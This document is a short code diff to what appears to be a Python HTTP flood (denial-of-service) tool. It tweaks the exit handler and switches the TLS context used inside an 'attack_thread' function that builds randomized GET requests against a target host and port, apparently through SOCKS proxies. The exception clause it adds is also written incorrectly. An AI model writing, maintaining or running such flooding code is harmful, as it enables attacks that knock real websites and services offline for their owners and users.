@@ -76,7 +76,8 @@ class make_resources:
 
 def closeProgram(reason: str = '\n[~] Exiting... Press Enter to close the window...'):
     print(reason)
-    input()
+    try: input()
+    except KeyboardInterrupt or EOFError: pass
     exit()
 
 def ParseUrl(url_to_parse: str):
@@ -210,7 +211,7 @@ def attack_thread(event: threading.Event, socks_type: int, target: str, port: in
             s.connect((target, port))
             test_allowed = True
             if protocol == 'https' and test_allowed:
-                s = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT).wrap_socket(s, server_hostname= target)
+                s = ssl.SSLContext(ssl.PROTOCOL_TLSv1_2).wrap_socket(s, server_hostname= target)
             try:
                 for _ in range(multiple + 1):
                     get_host = "GET " + path + add + make_random_url() + ' HTTP/1.1' + line_break + 'Host: ' + target + line_break
